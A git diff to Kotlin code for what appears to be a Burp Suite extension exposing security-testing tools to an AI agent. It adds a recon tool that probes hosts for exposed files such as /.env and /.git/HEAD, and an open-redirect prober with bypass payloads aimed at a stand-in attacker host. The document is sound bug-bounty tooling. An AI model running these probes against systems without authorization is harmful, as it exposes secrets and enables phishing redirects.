@@ -27,6 +27,209 @@ object AttackTools {
         registerParamMinerLite(reg, api)
         registerBypass403(reg, api)
         registerCorsProbe(reg, api)
+        registerFingerprint(reg, api)
+        registerOpenRedirect(reg, api)
+    }
+
+    // ============================ fingerprint_target ============================
+
+    private fun registerFingerprint(reg: ToolRegistry, api: MontoyaApi) {
+
+        reg.register(
+            name = "fingerprint_target",
+            description = "Comprehensive first-look recon of a single host: tech stack from headers, " +
+                "robots.txt + sitemap.xml + security.txt + .well-known endpoints, common admin paths, " +
+                "WAF/CDN detection, default error page bodies. Single tool replaces 10+ manual http_send_raw " +
+                "calls when the agent first encounters a target.",
+            inputSchema = S.obj(
+                properties = mapOf(
+                    "host"   to S.str("Target host"),
+                    "port"   to S.int("Port (default 443 if secure, else 80)"),
+                    "secure" to S.bool("HTTPS", default = true),
+                ),
+                required = listOf("host"),
+            ),
+        ) { args ->
+            val host = Args.str(args, "host")
+            val secure = Args.bool(args, "secure", true)
+            val port = Args.int(args, "port", if (secure) 443 else 80)
+            val service = HttpService.httpService(host, port, secure)
+
+            val probes = listOf(
+                "GET /" to "root",
+                "HEAD /" to "head_root",
+                "GET /robots.txt" to "robots",
+                "GET /sitemap.xml" to "sitemap",
+                "GET /.well-known/security.txt" to "security_txt",
+                "GET /.well-known/openid-configuration" to "oidc",
+                "GET /favicon.ico" to "favicon",
+                "GET /admin" to "admin",
+                "GET /login" to "login",
+                "GET /api" to "api_root",
+                "GET /api/v1" to "api_v1",
+                "GET /graphql" to "graphql",
+                "GET /server-status" to "server_status",
+                "GET /.git/HEAD" to "git_head",
+                "GET /.env" to "dotenv",
+                "GET /this-path-should-404-baseline-${System.nanoTime()}" to "baseline_404",
+            )
+            val results = probes.map { (line, label) ->
+                val parts = line.split(" ", limit = 2)
+                val method = parts[0]
+                val path = parts[1]
+                val raw = buildRawRequest(method, path, host, emptyList())
+                val r = sendOne(api, service, raw)
+                Triple(label, path, r)
+            }
+
+            // Tech-stack hints from root response.
+            val rootResp = results.firstOrNull { it.first == "root" }?.third
+            val techHints = mutableListOf<String>()
+            if (rootResp != null) {
+                rootResp.headerValue("Server")?.let { techHints += "Server: $it" }
+                rootResp.headerValue("X-Powered-By")?.let { techHints += "X-Powered-By: $it" }
+                rootResp.headerValue("X-AspNet-Version")?.let { techHints += "X-AspNet-Version: $it" }
+                rootResp.headerValue("X-Generator")?.let { techHints += "X-Generator: $it" }
+                rootResp.headerValue("Via")?.let { techHints += "Via: $it" }
+                if (rootResp.headerValue("CF-Ray") != null) techHints += "WAF: Cloudflare"
+                if (rootResp.headerValue("X-Akamai-Transformed") != null) techHints += "WAF: Akamai"
+                if (rootResp.headerValue("X-Sucuri-ID") != null) techHints += "WAF: Sucuri"
+                if (rootResp.headerValue("X-Amz-Cf-Id") != null) techHints += "CDN: AWS CloudFront"
+                if (rootResp.headerValue("X-Fastly-Request-ID") != null) techHints += "CDN: Fastly"
+                rootResp.headerValue("Set-Cookie")?.let { c ->
+                    when {
+                        c.contains("PHPSESSID", ignoreCase = true) -> techHints += "Lang: PHP"
+                        c.contains("JSESSIONID", ignoreCase = true) -> techHints += "Lang: Java/J2EE"
+                        c.contains("ASP.NET_SessionId", ignoreCase = true) -> techHints += "Lang: ASP.NET"
+                        c.contains("connect.sid", ignoreCase = true) -> techHints += "Lang: Node.js (Express)"
+                        c.contains("rack.session", ignoreCase = true) -> techHints += "Lang: Ruby (Rack)"
+                        c.contains("django_session", ignoreCase = true) -> techHints += "Lang: Python (Django)"
+                        c.contains("session=", ignoreCase = true) -> techHints += "Generic session cookie"
+                    }
+                }
+                rootResp.headerValue("Content-Security-Policy")?.let { techHints += "CSP present (truncated): ${it.take(80)}" }
+                if (rootResp.headerValue("Strict-Transport-Security") == null && secure) techHints += "Missing HSTS"
+                if (rootResp.headerValue("X-Frame-Options") == null) techHints += "Missing X-Frame-Options"
+            }
+
+            // Discoveries: any non-404 path that 404 baseline has.
+            val baseline404 = results.firstOrNull { it.first == "baseline_404" }?.third
+            val discoveries = results.filter { (label, _, r) ->
+                label != "baseline_404" && label != "root" && label != "head_root" &&
+                r.statusCode in 200..399 &&
+                (baseline404 == null || r.statusCode != baseline404.statusCode || r.bodyLength != baseline404.bodyLength)
+            }.map { (label, path, r) ->
+                mapOf(
+                    "label"       to label,
+                    "path"        to path,
+                    "status_code" to r.statusCode,
+                    "body_length" to r.bodyLength,
+                    "content_type" to r.headerValue("Content-Type"),
+                )
+            }
+
+            mapOf(
+                "host"           to host,
+                "port"           to port,
+                "secure"         to secure,
+                "root_status"    to (rootResp?.statusCode ?: 0),
+                "tech_hints"     to techHints,
+                "discoveries"    to discoveries,
+                "baseline_404"   to (baseline404?.let { mapOf("status" to it.statusCode, "length" to it.bodyLength) }),
+                "all_probes"     to results.map { (label, path, r) ->
+                    mapOf("label" to label, "path" to path,
+                          "status_code" to r.statusCode, "body_length" to r.bodyLength)
+                },
+            )
+        }
+    }
+
+    // ============================ open_redirect_probe ============================
+
+    private fun registerOpenRedirect(reg: ToolRegistry, api: MontoyaApi) {
+
+        reg.register(
+            name = "open_redirect_probe",
+            description = "Test a URL parameter for open-redirect vulnerability. Sends N variants of the " +
+                "attacker-controlled redirect target (canonical, double-slash, protocol-relative, whitespace " +
+                "tricks, encoded variants) and reports which produce a 30x to the attacker host.",
+            inputSchema = S.obj(
+                properties = mapOf(
+                    "host"      to S.str("Target host"),
+                    "port"      to S.int("Port"),
+                    "secure"    to S.bool("HTTPS", default = true),
+                    "path"      to S.str("Path including the redirect parameter (e.g. /login?next=)"),
+                    "param"     to S.str("Parameter name being tested (e.g. 'next', 'redirect_uri', 'returnTo')"),
+                    "attacker"  to S.str("Attacker-controlled host", default = "evil.example.com"),
+                ),
+                required = listOf("host", "path", "param"),
+            ),
+        ) { args ->
+            val host = Args.str(args, "host")
+            val secure = Args.bool(args, "secure", true)
+            val port = Args.int(args, "port", if (secure) 443 else 80)
+            val basePath = Args.str(args, "path")
+            val param = Args.str(args, "param")
+            val attacker = Args.strOrNull(args, "attacker") ?: "evil.example.com"
+            val service = HttpService.httpService(host, port, secure)
+
+            val payloads = listOf(
+                "canonical-https" to "https://$attacker",
+                "canonical-http" to "http://$attacker",
+                "protocol-relative" to "//$attacker",
+                "backslash-trick" to "/\\$attacker",
+                "double-slash" to "////$attacker",
+                "whitespace-prefix" to "%20//$attacker",
+                "tab-prefix" to "%09//$attacker",
+                "url-encoded" to "https%3A%2F%2F$attacker",
+                "double-encoded" to "https%253A%252F%252F$attacker",
+                "userinfo-trick" to "https://$host@$attacker",
+                "subdomain-trick" to "https://$host.$attacker",
+                "javascript-scheme" to "javascript:alert(1)",
+                "data-scheme" to "data:text/html,<h1>x</h1>",
+            )
+
+            val findings = mutableListOf<Map<String, Any?>>()
+            for ((name, value) in payloads) {
+                val sep = if (basePath.contains("?")) "&" else "?"
+                val urlPath = "$basePath${sep}$param=${value.replace(" ", "%20")}"
+                val raw = buildRawRequest("GET", urlPath, host, emptyList())
+                val r = sendOne(api, service, raw)
+                val location = r.headerValue("Location")
+                val redirectsToAttacker = location != null && (
+                    location.contains(attacker, ignoreCase = true) ||
+                    location.contains(value, ignoreCase = true)
+                )
+                if (r.statusCode in 300..399 && redirectsToAttacker) {
+                    findings.add(
+                        mapOf(
+                            "variant"      to name,
+                            "payload"      to value,
+                            "status_code"  to r.statusCode,
+                            "location"     to location,
+                            "exploitable"  to (location?.startsWith("http://$attacker", ignoreCase = true) == true ||
+                                              location?.startsWith("https://$attacker", ignoreCase = true) == true ||
+                                              location?.startsWith("//$attacker", ignoreCase = true) == true),
+                        ),
+                    )
+                }
+            }
+
+            mapOf(
+                "param"          to param,
+                "tested_payloads" to payloads.size,
+                "finding_count"  to findings.size,
+                "findings"       to findings,
+                "summary"        to when {
+                    findings.any { it["exploitable"] == true } ->
+                        "EXPLOITABLE: At least one payload produced a redirect to the attacker host. Worth ~$500-2k on most programs."
+                    findings.isNotEmpty() ->
+                        "Partial: Server redirects but Location header may be sanitized. Manual verification needed."
+                    else ->
+                        "No open redirect detected on this parameter. Consider testing other redirect-style parameters (logout_uri, callback, success_url)."
+                },
+            )
+        }
     }
 
     // ============================ param_miner_lite ============================
